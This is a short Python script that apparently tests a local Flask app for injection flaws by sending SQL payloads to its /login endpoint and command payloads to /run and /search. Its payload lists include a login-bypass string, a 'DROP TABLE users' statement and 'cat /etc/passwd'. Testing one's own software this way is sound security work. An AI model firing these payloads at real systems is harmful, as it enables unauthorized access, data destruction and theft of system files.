import requests

# Define the Flask server details
BASE_URL = 'http://127.0.0.1:5000'

# Define payloads for SQL Injection and Command Injection
sql_injection_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --"
]

command_injection_payloads = [
    "ls",
    "cat /etc/passwd",
    "pwd"
]

def test_sql_injection():
    """
    Test for SQL Injection by sending payloads to the /login endpoint.
    """
    vulnerable = False
    print("\n[SQL Injection Test]")
    
    for payload in sql_injection_payloads:
        # Send a GET request to the /login endpoint with the SQL injection payload
        params = {'username': 'admin', 'password': payload}
        response = requests.get(f"{BASE_URL}/login", params=params)
        
        if "Invalid credentials" not in response.text:  # Check if login succeeded improperly
            vulnerable = True
            print(f"[!] Potential SQL Injection with payload: {payload}")
    
    if not vulnerable:
        print("[-] No SQL Injection vulnerabilities detected.")

def test_command_injection():
    """
    Test for Command Injection by sending payloads to the /run and /search endpoints.
    """
    vulnerable = False
    print("\n[Command Injection Test - /run Endpoint]")
    
    # Test /run endpoint for command injection
    for payload in command_injection_payloads:
        response = requests.get(f"{BASE_URL}/run", params={'command': payload})
        
        if "Executed" in response.text and payload in response.text:
            vulnerable = True
            print(f"[!] Potential Command Injection with payload: {payload}")
    
    print("\n[Command Injection Test - /search Endpoint]")
    
    # Test /search endpoint for command injection
    for payload in command_injection_payloads:
        data = {'query': payload}
        response = requests.post(f"{BASE_URL}/search", data=data)
        
        if payload in response.text:  # Check if command output is reflected
            vulnerable = True
            print(f"[!] Potential Command Injection with payload: {payload}")

    if not vulnerable:
        print("[-] No Command Injection vulnerabilities detected.")

if __name__ == "__main__":
    # Test for SQL Injection
    test_sql_injection()
    
    # Test for Command Injection
    test_command_injection()
